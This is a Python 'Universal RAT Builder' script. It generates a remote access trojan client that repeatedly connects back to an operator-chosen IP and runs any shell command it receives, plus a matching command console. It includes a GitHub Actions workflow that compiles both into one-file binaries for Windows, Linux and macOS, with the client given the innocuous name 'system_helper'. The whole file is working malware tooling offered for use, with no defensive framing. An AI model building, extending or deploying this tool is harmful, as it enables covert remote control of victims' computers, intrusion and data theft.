import os
import sys
import subprocess
import shutil
import platform
import re

# --- SOURCE TEMPLATES (Sanitized for Cross-Platform) ---

CLIENT_SOURCE = """import socket
import subprocess
import os
import sys
import time

SERVER_IP = '{SERVER_IP}'
SERVER_PORT = {SERVER_PORT}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(60)

def execute_command(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = process.communicate(timeout=30)
        output = stdout + stderr
        if not output:
            return f"[SUCCESS] Command executed.".encode('utf-8')
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return f"[ERROR] Timeout.".encode('utf-8')
    except Exception as e:
        return f"[ERROR] {str(e)}".encode('utf-8')

def main():
    while True:
        try:
            socket_conn = connect()
            while True:
                command = socket_conn.recv(1024).decode()
                if command.lower() == 'exit':
                    socket_conn.close()
                    return
                output = execute_command(command)
                socket_conn.send(output)
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
"""

SERVER_SOURCE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'
PORT = {SERVER_PORT}

def main():
    print(f"--- RAT Server (Port {PORT}) ---")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {PORT}")
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    client, addr = server.accept()
    print(f"[+] Connected: {addr}")

    while True:
        try:
            cmd = input("# Command: ")
            if cmd.lower() == 'exit':
                client.send('exit'.encode())
                break
            client.send(cmd.encode())
            data = client.recv(4096)
            if not data:
                print("[!] Lost connection.")
                break
            print(data.decode())
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    client.close()
    server.close()

if __name__ == "__main__":
    main()
"""

# --- GITHUB ACTIONS WORKFLOW TEMPLATE ---
GITHUB_WORKFLOW = """name: Build RAT Executables

on:
  workflow_dispatch:  # Allows manual triggering

jobs:
  build-windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install Dependencies
        run: |
          pip install pyinstaller
      - name: Build Client EXE
        run: |
          python -m PyInstaller --onefile --name system_helper client_source.py
      - name: Build Server EXE
        run: |
          python -m PyInstaller --onefile --name control_panel server_source.py
      - name: Upload Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: windows-binaries
          path: |
            dist/system_helper.exe
            dist/control_panel.exe

  build-linux:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install Dependencies
        run: |
          pip install pyinstaller
      - name: Build Client Binary
        run: |
          python -m PyInstaller --onefile --name system_helper client_source.py
      - name: Build Server Binary
        run: |
          python -m PyInstaller --onefile --name control_panel server_source.py
      - name: Upload Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: linux-binaries
          path: |
            dist/system_helper
            dist/control_panel

  build-macos:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install Dependencies
        run: |
          pip install pyinstaller
      - name: Build Client Binary
        run: |
          python -m PyInstaller --onefile --name system_helper client_source.py
      - name: Build Server Binary
        run: |
          python -m PyInstaller --onefile --name control_panel server_source.py
      - name: Upload Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: macos-binaries
          path: |
            dist/system_helper
            dist/control_panel
"""

def install_pyinstaller():
    try:
        import PyInstaller
        return True
    except ImportError:
        print("[*] Installing PyInstaller...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            return True
        except:
            return False

def is_valid_ip(ip):
    pattern = re.compile(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return pattern.match(ip) is not None

def build_local(name, source_code):
    print(f"\n[*] Building native executable for {name}...")
    with open(f"{name}_source.py", "w") as f:
        f.write(source_code)
    
    cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--name", name, "--clean", f"{name}_source.py"]
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Native build successful for {name}.")
        return True
    except:
        print(f"[-] Native build failed for {name}.")
        if os.path.exists(f"{name}_source.py"):
            os.remove(f"{name}_source.py")
        return False

def main():
    print("--- Universal RAT Builder ---")
    print("This tool generates source code for all platforms and builds the native version.")
    print("For cross-platform binaries (Win/Mac/Linux), we will use GitHub Actions (Free).")
    
    # Get Config
    ip = input("Enter Server IP for Client: ").strip()
    while not is_valid_ip(ip):
        print("Invalid IP.")
        ip = input("Enter Server IP for Client: ").strip()
    
    port_input = input("Enter Port (default 9999): ").strip()
    port = 9999 if not port_input else int(port_input)
    
    # Generate Sources
    print("\n[*] Generating source code for all platforms...")
    with open("client_source.py", "w") as f:
        f.write(CLIENT_SOURCE.replace("{SERVER_IP}", ip).replace("{SERVER_PORT}", str(port)))
    with open("server_source.py", "w") as f:
        f.write(SERVER_SOURCE.replace("{SERVER_PORT}", str(port)))
        
    # Build Local
    can_build = install_pyinstaller()
    if can_build:
        build_local("system_helper", "") # Sources already written
        build_local("control_panel", "")
    else:
        print("[-] Could not install PyInstaller. Skipping local build.")
        
    # Generate GitHub Workflow
    print("\n[*] Generating GitHub Actions workflow for cross-platform build...")
    os.makedirs(".github/workflows", exist_ok=True)
    with open(".github/workflows/build_rat.yml", "w") as f:
        f.write(GITHUB_WORKFLOW)
        
    print("\n[SUCCESS] Setup Complete!")
    print("1. Local executables (if build succeeded) are in the 'dist' folder.")
    print("2. To get Win/Mac/Linux binaries:")
    print("   - Push this code to a GitHub repository.")
    print("   - Go to Actions tab -> Select 'Build RAT Executables' -> Run Workflow.")
    print("   - Download the artifacts after the job completes.")
    print("\nThis ensures you get clean, compiled binaries for all OS safely.")

if __name__ == "__main__":
    main()
